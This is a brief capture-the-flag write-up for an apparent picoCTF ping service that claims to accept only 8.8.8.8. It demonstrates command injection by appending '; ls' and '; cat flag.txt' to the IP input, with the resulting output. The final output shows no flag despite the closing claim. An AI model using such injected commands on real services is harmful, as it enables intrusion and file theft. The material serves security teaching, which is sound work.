@@ -1,0 +1,49 @@
+Challenge Description
+
+The service asks for an IP address to ping, claiming to only allow "8.8.8.8" due to "tight security." However, it's vulnerable to command injection.
+Step-by-Step Solution
+
+    Initial Connection
+    bash
+
+nc mysterious-sea.picoctf.net 64615
+
+The service prompts: Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'):
+
+Testing for Command Injection
+First, test if command injection is possible by trying to list directory contents:
+bash
+
+8.8.8.8; ls
+
+Output:
+text
+
+PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=8.50 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=8.49 ms
+--- 8.8.8.8 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1002ms
+rtt min/avg/max/mdev = 8.493/8.498/8.503/0.005 ms
+flag.txt
+script.sh
+
+The ; ls after the ping output confirms command injection works, revealing flag.txt and script.sh.
+
+Retrieving the Flag
+Read the flag file using the same technique:
+bash
+
+8.8.8.8; cat flag.txt
+
+Output:
+text
+
+PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=8.52 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=8.51 ms
+--- 8.8.8.8 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1002ms
+rtt min/avg/max/mdev = 8.510/8.513/8.517/0.003 ms
+
+It should print the flag .
